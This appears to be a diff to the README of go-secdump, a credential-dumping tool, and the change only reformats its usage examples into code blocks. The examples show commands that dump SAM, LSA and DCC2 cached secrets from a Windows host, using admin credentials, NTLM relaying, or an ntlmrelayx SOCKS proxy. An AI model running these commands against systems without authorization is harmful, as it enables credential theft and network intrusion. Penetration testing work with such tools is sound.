@@ -8,21 +8,23 @@
 
 ### Usage:
 
-#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local
+    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local
 
 ### or
 
-#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2
+    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2
 
-#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam (Dump only SAM)
+    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam (Dump only SAM)
 
-#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa (Dump only LSA)
+    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa (Dump only LSA)
 
-#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2 (Dump only DCC2 cache secrets)
+    ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2 (Dump only DCC2 cache secrets)
 
 # Dump secrets via NTLM Relaying
 
-#### 1) ./go-secdump --host 192.168.0.100 -n --relay (Dump registry secrets using NTLM relaying)
+#### 1) 
+
+    ./go-secdump --host 192.168.0.100 -n --relay (Dump registry secrets using NTLM relaying)
 
 ### then
 
@@ -30,7 +32,11 @@
 
 # Dump secrets via SOCKS Proxy
 
-#### 1) ./ntlmrelayx.py -socks -t 192.168.0.100 -smb2support --no-http-server --no-wcf-server --no-raw-server
+#### 1) 
 
-#### 2) ./go-secdump --host 192.168.0.100 --user Administrator -n --socks-host 127.0.0.1 --socks-port 1080
+    ./ntlmrelayx.py -socks -t 192.168.0.100 -smb2support --no-http-server --no-wcf-server --no-raw-server
+
+#### 2) 
+
+    ./go-secdump --host 192.168.0.100 --user Administrator -n --socks-host 127.0.0.1 --socks-port 1080
 
